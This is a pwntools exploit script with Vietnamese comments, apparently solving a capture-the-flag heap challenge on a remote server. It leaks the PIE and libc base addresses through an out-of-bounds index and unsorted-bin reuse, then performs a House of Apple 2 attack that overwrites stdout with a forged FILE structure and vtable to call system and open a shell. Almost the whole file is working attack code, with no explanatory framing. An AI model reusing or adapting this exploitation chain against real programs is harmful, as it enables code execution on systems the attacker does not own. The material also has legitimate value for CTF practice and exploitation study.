from pwn import *

# ================= CẤU HÌNH =================
exe = ELF('./chal')
# Load file libc của ĐỀ BÀI
libc = ELF('./libc.so.6') 

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

# ================= OFFSET (CẦN BẠN ĐIỀN) =================
# Hãy điền số bạn vừa tính ở BƯỚC 1 vào đây.
# Ví dụ: 0x21ba60 (Nếu main_arena là 21ba00)
LIBC_OFFSET = 0x234b20
# =======================================================

# Khởi động process với LD_PRELOAD để ép dùng libc của đề
# env={'LD_PRELOAD': './libc.so.6'}
# try:
#     r = process('./chal', env={'LD_PRELOAD': './libc.so.6'})
# except:
#     log.error("Không thể chạy với LD_PRELOAD. Libc version không tương thích với máy WSL của bạn. Bạn cần dùng tool 'pwninit' để patch binary.")

r = remote("amt.rs", 26797)

# ================= HELPER =================
def create(idx, size, data):
    if isinstance(data, str): data = data.encode()
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', str(idx).encode())
    r.sendlineafter(b': ', hex(size).encode())
    r.sendafter(b': ', data)

def delete(idx):
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', str(idx).encode())

def view(idx):
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b': ', str(idx).encode())

log.info("=== EXPLOIT VỚI LIBC CỦA ĐỀ BÀI ===")

# --- 1. LEAK PIE (Index -7) ---
view(-7)
r.recvuntil(b'data: ')
pie_leak = u64(r.recvline()[:-1][:8].ljust(8, b'\0'))
pie_base = pie_leak - 0x4008
if pie_base & 0xfff != 0: pie_base = pie_leak & ~0xfff
exe.address = pie_base
log.success(f"PIE Base: {hex(pie_base)}")

# --- 2. LEAK LIBC (HEAP REUSE) ---
# Chunk A -> Unsorted Bin
create(0, 0x500, b"A"*0x10)
create(1, 0x20, b"B"*0x10)
delete(0)
create(0, 0x500, b"C"*8) # Ghi đè fd, giữ bk

view(0)
r.recvuntil(b'data: ')
d = r.recvline()[:-1]

if len(d) > 8:
    heap_leak = u64(d[8:16].ljust(8, b'\0'))
    log.info(f"Raw Heap Leak: {hex(heap_leak)}")
    
    # Tính Libc Base bằng Offset của Đề Bài
    libc.address = heap_leak - LIBC_OFFSET
    log.success(f"Libc Base: {hex(libc.address)}")
else:
    log.error("Leak thất bại. Có thể offset PIE sai hoặc heap bị lỗi.")

# --- 3. EXPLOIT (HOUSE OF APPLE 2) ---
system = libc.sym['system']
_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
notes_addr = pie_base + 0x4040

# Fake Vtable tại notes[28]
fake_vtable = fit({0x68: system}, filler=b'\x00')
create(28, 0x100, fake_vtable)

# Payload đè stdout
payload = fit({
    0x00: b'  sh;',
    0x28: 1,
    0x88: notes_addr,        # _lock (Fix crash)
    0xa0: notes_addr,        # _wide_data
    0xd8: _IO_wfile_jumps,
}, filler=b'\x00').ljust(0x100, b'\0')

log.info("Overwriting stdout...")
create(-4, 0x400, payload)

r.sendline(b'cat flag')
r.interactive()